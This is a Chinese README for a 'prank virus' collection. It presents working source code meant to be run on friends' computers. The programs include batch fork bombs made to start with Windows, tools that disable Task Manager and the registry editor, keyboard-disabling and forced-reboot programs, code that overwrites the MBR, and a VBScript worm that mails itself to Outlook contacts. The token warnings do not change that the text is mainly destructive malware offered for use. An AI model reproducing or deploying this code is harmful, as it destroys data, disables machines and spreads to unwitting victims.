# 整蛊病毒使用说明 | README

呵呵，没想到你这么勇这么想要对朋友的电脑执行~~毁灭法则~~
不过，在~~去整废朋友的电脑~~开始压力测试之前，**请先仔仔细细的阅读一下这些说明**。
有些病毒需要手动调整，而且我的本意是**让大家学习编程**。
> 其实病毒就是编程中某些代码的错误写法(就比如死循环，'炸内存'，数组越界……)，造成灾难。
> 而且如果大家懂得了病毒，是不是也会懂得病毒的原理了呢？

目录:

[toc]



最后还是得提醒一句:  
***病毒千万种，电脑就几台。***   
***损友不规范，你我两行泪。***

----

# 病毒1号 | 多窗口管道核打击病毒
终于可以介绍病毒了。
该病毒主体采用`Batch`批处理编写。
病毒主体如下：
```batch
@rem '@'关闭行内前面的C:\.....\,echo off全面关闭。echo off关闭后可用echo on打开回显
@rem 'ECHO'命令不可以打印'OFF'和'ON'，大小写都不可以
@rem 我写了@echo off是为了更干净一点
@rem rem命令用于注释，一般BAT会省略(行注释),::也可以用做注释，但得
@echo off
::他来了他来了，病毒主体来了。这是一个goto语句的标记（也可以是多个）
::不过goto语句在高级语言中已经非常不受待见了，因为他破坏了原有的流程，就像C++中friend友元破坏了封装一样
:loop
::此处开始搞事
::start是开启新窗口，参数是程序名。%0是文件本身的名字，自我复制
start %0
::这里开始崩溃
::'|'是管道操作符
::单单%0 | %0都可以把电脑搞崩了，我还火上浇油多弄了几个
%0 | %0
%0 | %0 | %0
%0 | %0 | %0 | %0
::goto语句造成了死循环，这就是goto语句不受待见的原因
::雪上加霜
goto loop
```

这样的代码建议自己在虚拟机里面玩吧……

优点:
- 可自繁殖，自我复制窗口
- 简单
- 可以对未保存的文件进行毁灭性的打击
- 立刻失去一个好朋友

# 病毒1XS号 | 自启动多窗口管道核打击病毒
这次是真的每天损掉好朋友咯。
主体没有变，新增了一个VBScript文件
插件如下:

```vbscript
set ws=WScript.CreateObject("WScript.Shell") 
rem vbscript同样可以用rem做注释
rem 下面搞自己的病毒路径，这里写的是桌面，Administrator是用户名，得改
ws.Run "C:\\Users\\Administrator\\Desktop\\virus1.bat /start",0
```
`Win+R`打开运行窗口，执行`shell:startup`，进入自启动窗口，把这个VBS文件放进去。
这样……病毒就会……开机自启动了。
切记——这个病毒杀伤力极强。
除非有所谓的**深仇大恨**,否则别搞。
> 我有一个朋友，他安装了我这个病毒，花了半个小时以惊人的手速才搞好电脑

---
# 病毒2号 | Python内存病毒
此病毒会产生大量文件，造成内存崩溃。
请谨慎使用.
代码如下



```python
# -*- coding : utf-8 -*-
#!/usr/bin/python3
#循环变量
nameso = 0
while True:
    #创建文件，打开文件
    file = open(f"viruscplssdasfoisjdijaosidjfoiajdfoiajjdofajsidfjaj{nameso}.log",'w+')
    for x in range(0,10000):
        file.write("""
        恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再见,好朋友恭喜你,感染上了病毒!再见,电脑！再......<此处省略了几万个字符>
        """)
    #循环变量++
    nameso+=1
```
运行时间越长越好。
放在C盘直接爆
> 这个病毒我已经用`pyinstaller`工具打包成了`exe`可执行文件了，存放在`dist`文件夹里。
> `build`和`virus2.spec`是编译日志之类的，反正先别删就对了

---
# 病毒3号 | C++KILL版
这病毒不得了，可以一下子把注册表之类的全部禁用。
还能改壁纸。
用C++编写
代码如下:
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <time.h>
#include <tchar.h>
#include <shlobj.h>		//SHGetSpecialFolderPath()所属头文件
#include <iostream>
#include <urlmon.h>
#pragma comment(lib,"urlmon.lib")

//病毒的增殖模块,产生垃圾文件,要实现无限增殖只需要在主函数加一个循环
void Reproduce()
{
	char name_str[100] = {0};
	int name;
	srand((unsigned)time(NULL));	//随机数种子
	name = rand() % 1024;	
	itoa(name, name_str, 16);	//将随机数转化成字符串
	TCHAR szpath[MAX_PATH];
	GetModuleFileName(NULL, szpath, MAX_PATH);	//获取当前执行程序的路径
	char target[100] = {0};
	TCHAR Destop[MAX_PATH];
	SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);	//获取桌面绝对路径
	strcat(target, Destop);
	strcat(target, "\\");
	strcat(target, name_str);
	strcat(target, ".exe");
	
	CopyFile(szpath, target, FALSE);
	
	//为增殖产生的文件创建进程
	//STARTUPINFO si = { 0 };
	//si.cb = sizeof(si);
	//PROCESS_INFORMATION pi;
	//CreateProcess(target, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

//注册表修改实现开机自启动,同时在系统文件目录下创建拷贝文件
void RegKeyStart()
{
	char str[MAX_PATH];
	GetModuleFileName(NULL, str, MAX_PATH);
	char SystemPath[512];
	GetSystemDirectory(SystemPath, sizeof(SystemPath));		//获取系统目录路径
	strcat(SystemPath, "\\explore.exe");
	CopyFile(str, SystemPath, false);
	DWORD len;
	HKEY hkey;
	len = strlen(SystemPath);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueEx(hkey, SystemPath, 0, REG_SZ, (unsigned char *)SystemPath, len);
	RegCloseKey(hkey);
	/*创建代码实现文件关联，也就是只要打开txt文件就执行当前用户程序,使用txt方式触发
	*/
	LPCTSTR data_set = "txtfile\\shell\\open\\command";
	RegOpenKeyEx(HKEY_CLASSES_ROOT, data_set, 0, KEY_WRITE, &hkey);
	RegSetValueEx(hkey, NULL, 0, REG_EXPAND_SZ, (unsigned char *)SystemPath, len);
	RegCloseKey(hkey);
}

//注册表修改实现禁用管理器
void RegTaskmanagerForbidden()
{
	HKEY hkey;
	DWORD v = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&v, sizeof(DWORD));
	RegCloseKey(hkey);
}

//注册表修改实现禁用注册表编辑器
void RegEditForbidden()
{
	HKEY hkey;
	DWORD v = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&v, sizeof(DWORD));
	RegCloseKey(hkey);
}

//注册表修改实现更换桌面背景
void RegModifyBackroud()
{
	DWORD v = 1;
	char str[MAX_PATH];
	GetModuleFileName(NULL, str, MAX_PATH);
	strcat(str, "hacked.jpg");
 	URLDownloadToFile(NULL, "https://images.alphacoders.com/509/thumb-1920-509367.jpg", str, 0, 0);
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "Wallpaper", 0, REG_SZ, (unsigned char *)str, sizeof(str));
	RegSetValueEx(hkey, "WallpaperStyle", 0, REG_DWORD, (LPBYTE)&v, sizeof(DWORD));
}

//注册表修改屏蔽用户键盘输入
void RegKeyBoardForbidden()
{
	HKEY hkey;
	char scancodemap[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x1A\x00\x00\x00"
		"\x02\x00\x10\x00"
		"\x02\x00\x11\x00"
		"\x02\x00\x12\x00"
		"\x02\x00\x13\x00"
		"\x02\x00\x14\x00"
		"\x02\x00\x15\x00"
		"\x02\x00\x16\x00"
		"\x02\x00\x17\x00"
		"\x02\x00\x18\x00"
		"\x02\x00\x19\x00"
		"\x02\x00\x1E\x00"
		"\x02\x00\x1F\x00"
		"\x02\x00\x20\x00"
		"\x02\x00\x21\x00"
		"\x02\x00\x22\x00"
		"\x02\x00\x23\x00"
		"\x02\x00\x24\x00"
		"\x02\x00\x25\x00"
		"\x02\x00\x26\x00"
		"\x02\x00\x2C\x00"
		"\x02\x00\x2D\x00"
		"\x02\x00\x2E\x00"
		"\x02\x00\x2F\x00"
		"\x02\x00\x30\x00"
		"\x02\x00\x31\x00"
		"\x02\x00\x32\x00"
		"\x00\x00\x00\x00";
	RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", &hkey);
	RegSetValueEx(hkey, "Scancode Map", 0, REG_BINARY, (LPBYTE)scancodemap, 120);//scancodemap数组长度为120字节
	RegCloseKey(hkey);
	MessageBox(NULL, "破坏键盘成功！", "Error", MB_OK);
}

BOOL DeleteDrive(const TCHAR *SThide)
{
	if (!DefineDosDevice(DDD_RAW_TARGET_PATH, SThide, ""))
		return false;
	else
		return true;
}
int main(int argc, char** argv)
{
	//FreeConsole();
	HWND hwndDOS = GetForegroundWindow(); //得到前台窗口的句柄
	ShowWindow(hwndDOS, SW_HIDE); //隐藏窗口
	//以下代码用于检测任务管理器是否被禁用
	BOOL Revised=0;
	HKEY hkey;
	long ret0, ret1;
	LPCTSTR data_set = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
	LPCTSTR  psName = "DisableTaskMgr";
	TCHAR   ValueInfo[100];
	DWORD cType;
	DWORD   ValueSize = sizeof(ValueInfo);
	ret0 = RegOpenKeyEx(HKEY_CURRENT_USER, data_set, 0, KEY_READ, &hkey);
	ret1 = RegQueryValueEx(hkey, psName, NULL, &cType, (LPBYTE)ValueInfo, &ValueSize);
	if (ret0!=ERROR_SUCCESS||ret1 != ERROR_SUCCESS)
	{
		printf("not Revised!\n");
		Revised = 0;
	}
	else if (!strcmp(ValueInfo, "\x01\x00\x00\x00")) {
		Revised = 1;
	}
	else {
		Revised = 0;
	}
	RegCloseKey(hkey);
	int i;
	if (!Revised)	//如果任务管理器没有被禁用执行如下操作
	{
		RegKeyStart();
		RegTaskmanagerForbidden();
		RegEditForbidden();
		RegModifyBackroud();		//修改桌面背景
		RegKeyBoardForbidden();		//修改注册表屏蔽用户键盘输入
		Sleep(5000);
		if (DeleteDrive("C:"))
			MessageBox(NULL, "破坏盘符成功！", "Error", MB_OK);
		DefineDosDevice(DDD_RAW_TARGET_PATH, "F:", "\\??\\C:\\winnt");
		system("title 警告");
		MessageBox(NULL, "计算机将于60秒内强制关机！", "Error", MB_OK);
		system("shutdown -f -s -t 10 -c ""计算机将于60秒内强制关机！""");
	}
	else {
		MessageBox(NULL, "task manager has been forbidden!", "Error", MB_OK);
		for (i = 0; i < 30; i++) {
			Reproduce();		//产生垃圾文件，恶意增殖
			Sleep(1000);
		}
		if (DeleteDrive("C:"))
			MessageBox(NULL, "破坏盘符成功！", "Error", MB_OK);
		DefineDosDevice(DDD_RAW_TARGET_PATH, "F:", "\\??\\C:\\winnt");
	}
	
	return 0;
}
```
病毒3号参考文章是<https://blog.csdn.net/weixin_45605352/article/details/115533134?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-115533134-blog-79323015.pc_relevant_antiscanv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-115533134-blog-79323015.pc_relevant_antiscanv2&utm_relevant_index=6>
自行参考。

**注:我的环境这个病毒编译不了，有报错，可以自己用VC++6.0试一下**

---
# 病毒4号 | C++病毒老二

C++编写，病毒如下

```cpp
#define _CRT_SECURE_NO_WARNINGS
#include<iostream>
#include<string>
#include<Windows.h>
#include<thread>
#include<tchar.h>
using namespace std;
int x = GetSystemMetrics(SM_CXSCREEN);
int y = GetSystemMetrics(SM_CYSCREEN);
DWORD WINAPI mouse(LPVOID lpParameter)
{
    srand(time(0));
    while (1)
    {
        SetCursorPos(rand() % x, rand() % y);
    }
    return 0L;
}
int main(int argc, char** argv)
{
    HWND hWnd = GetConsoleWindow();
    SetWindowLong(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
    hWnd = FindWindow(L"ConsoleWindowClass", NULL);
    if (hWnd)
    {
        ShowWindow(hWnd, SW_HIDE);
    }
    if (MessageBox(0, L"本程序是病毒，是否打开？如打开，后果自负！", L"WARNING", MB_YESNO | MB_ICONWARNING) == 6)
    {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)  
        {
            TCHAR strExeFullDir[MAX_PATH];
            GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
            TCHAR strDir[MAX_PATH] = {};
            DWORD nLength = MAX_PATH;
            long result = RegGetValue(hKey, nullptr, _T("GISRestart"), RRF_RT_REG_SZ, 0, strDir, &nLength);
            if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
            {
                RegSetValueEx(hKey, _T("GISRestart"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR));
                RegCloseKey(hKey);
            }
        }
        HANDLE hThread = CreateThread(NULL, 0, mouse, NULL, 0, NULL);
        CloseHandle(hThread);
        while (1)
        {
            char s[100] = "start ";
            system(strcat(s, argv[0]));
        }
    }
    return 0;
}
```
开机自启动，更恶心

**注:我的环境这个病毒编译不了，有报错，可以自己用VC++6.0试一下**

---
# 病毒5号 | C++无限重启病毒

```cpp
#include<stdlib.h>
int main()
{
    system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v restart /t  REG_SZ /d \"C:\\Windows\\System32\\shutdown /r\"");
    system("shutdown /r");
    return 0;
}
```

会无限重启。也可以改为无限关机
```cpp
//把shutdown /r改成shutdown /s
system("shutdown /s");
```

---
# 病毒6号 | 勒索病毒
采用`Batch`批处理
只要1行:
```batch
assoc .exe = txtfile
```
可把`EXE`可执行文件变成文本文件，无法执行

但为网上比特币勒索好了很多 (起码你的文件搞不回来了)

---
# 病毒7号 | 蠕虫病毒

使用`VBScript`

源码如下

```vbscript
On Error Resume Next

Set fs=CreateObject("Scripting.FileSystemObject")

Set dir1=fs.GetSpecialFolder(0)

Set dir2=fs.GetSpecialFolder(1)

Set so=CreateObject("Scripting.FileSystemObject")

dim r

Set r=CreateObject("Wscript.Shell")

so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Win32system.vbs")

so.GetFile(WScript.ScriptFullName).Copy(dir2&"\Win32system.vbs")

so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\启动\Win32system.vbs")

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",63000000,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry",""

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win32system","Win32system.vbs"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",1,"REG_DWORD"

r.Regwrite "HKLM\Software\CLASSES\.reg\","txtfile"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","你中毒了！"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","友情娱乐！找我要解毒文件！"

Set ol=CreateObject("Outlook.Application")

On Error Resume Next

For x=1 To 100

Set Mail=ol.CreateItem(0)

Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)

Mail.Subject="今晚你来吗？"

Mail.Body="朋友你好：您的朋友Rose给您发来了热情的邀请。具体情况请阅读随信附件，祝您好运！ 同城约会网"

Mail.Attachments.Add(dir2&"Win32system.vbs")

Mail.Send

Next

ol.Quit

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"

r.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://liudemin.myetang.com"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",1,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",1,"REG_DWORD"

'后缀名为：vbs

'为了防止意外发生。以下是解毒代码！↘

Set fs=CreateObject("Scripting.FileSystemObject")

Set dir1=fs.GetSpecialFolder(0)

Set dir2=fs.GetSpecialFolder(1)

Set so=CreateObject("Scripting.FileSystemObject")

dim r

Set r=CreateObject("Wscript.Shell")

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\deltree.exe","start.exe /m deltree /y "&dir1&"\Win32system.vbs"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\deltree.exe","start.exe /m deltree /y "&dir2&"\Win32system.vbs"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\deltree.exe","start.exe /m deltree /y "&dir1&"\Start Menu\Programs\启动\Win32system.vbs"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",0,"REG_DWORD"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry","scanregw.exe /autorun"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",0,"REG_DWORD"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Win32system",""

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",0,"REG_DWORD"

r.Regwrite "HKLM\Software\CLASSES\.reg\","regfile"

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption",""

r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText",""

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",0,"REG_DWORD"

r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",0,"REG_DWORD"
```

---
# 病毒8号 | C++耗内存病毒

```cpp
#include <Windows.h>
#include <iostream>
#include <fstream>
using namespace std;
 
int main()
{
    char a[9] = "abc.bat";
    
    ofstream file_out(a);
    file_out<<"%0|%0";
    file_out.close();
    
    system( a );
    
    return 0;
}
```

---
# 病毒9号 | 鸡飞狗跳的鼠标

```cpp
#include<windows.h>
#include<bits/stdc++.h>
using namespace std;
int main()
{
    system("Shutdown -s -t 60");
    HWND hwnd;
    hwnd=FindWindow("ConsoleWindowClass",NULL);
    if(hwnd) ShowWindow(hwnd,SW_HIDE);
	int x=GetSystemMetrics(SM_CXSCREEN);
	int y=GetSystemMetrics(SM_CYSCREEN);
	srand(time(0));
	while(1)cout<<"Oh！！！"<<endl&&SetCursorPos(rand()%x,rand()%y);
}
```

---
# 病毒10号 | FY病毒
慎用:含有敏感词
```cpp

#include <windows.h>
#include <winioctl.h>
 
unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";
/*
00000000  B81200 mov ax, 12H ; ah = 0, al = 12h (640 * 480)
00000003  CD10 int 10h ; 进入图形显示方式，隐藏光标
00000005  BD187C mov bp, Msg ; ES:BP = 串地址
00000008  B91800 mov cx, 18h ; CX = 串长度
0000000B  B80113 mov ax, 1301h ; AH = 13,  AL = 01h
0000000E  BB0C00 mov bx, 000ch ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)
00000011  BA1D0E mov dx, 0e1dh ; dh行, dl列
00000014  CD10 int 10h ; 10h 号中断
00000016  E2FE loop $
Msg: db " Fuck you ^_^ :-)"
*/
int  main()
{
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = { 0 };
 
	// 重新构造MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
 
	hDevice = CreateFile
	(
		L"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl
	(
		hDevice,
		FSCTL_LOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);
	// 写入病毒内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
	(
		hDevice,
		FSCTL_UNLOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NULL
	);
	CloseHandle(hDevice);
	return 0;
}
```

---
# 病毒包11号 | 3650病毒压缩包

**温馨提示:这个压缩包是我从网上搞来的一个压缩包，威力我也不知道，里面都是正经的病毒，不像我们这么简陋，纯粹就是测试杀毒软件用的，切勿在实体机上搞这玩意（朋友的电脑我也不建议，有些病毒像`WindowsXpHorror`会把`MBR`给破坏掉，简单来说就是磁盘没了，文件没了，好朋友没了，如果好朋友不是经常捣鼓系统，懂点`PE`系统和`DG`分区的话，电脑也废了。），附赠病毒，自行考虑**

<hr/>

再说一遍:  
***病毒千万种,电脑就几台。***  
***损友不规范,你我两行泪。***

***一定不要在实体机上运行啊！***

